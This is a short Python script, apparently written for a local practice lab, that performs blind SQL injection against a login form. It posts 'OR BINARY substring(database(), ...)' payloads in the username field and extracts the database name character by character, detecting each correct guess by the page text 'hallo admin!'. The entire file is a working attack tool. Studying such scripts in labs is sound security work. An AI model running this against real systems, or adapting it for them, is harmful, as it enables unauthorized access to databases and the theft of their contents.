import requests,sys
url ='http://localhost/hacking/login.php'
for i in range(1,25):
    for c in range(0x20,0x7f):
        payload = "OR BINARY substring(database(), %d, 1)='%s'"%(i,chr(c))
        data = {'username':payload, 'password':'1','login':'login'}
        res = requests.post(url,data=data)

        if 'hallo admin!' in res.text:
            sys.stdout.write(chr(c))
            sys.stdout.flush()
            break
        else:
            False